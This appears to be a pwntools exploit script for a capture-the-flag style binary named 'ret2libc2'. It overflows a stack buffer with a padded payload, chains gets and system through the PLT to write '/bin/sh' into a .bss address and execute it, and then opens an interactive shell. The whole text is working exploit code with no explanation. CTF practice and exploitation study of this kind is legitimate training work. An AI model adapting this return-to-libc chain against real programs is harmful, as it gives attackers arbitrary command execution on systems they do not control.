from pwn import *

p = process("./ret2libc2")
gdb.attach(p,"b *0x08048595")
elf = ELF("./ret2libc2")

system = elf.plt["system"]
gets = elf.plt["gets"]
cmd = "/bin/sh"
bss_addr = 0x0804A200
p.recvuntil("ret2libc2\n")
payload = "a" * 0x108 + "junk"
payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)
p.sendline(payload)
p.sendline(cmd)
p.interactive()
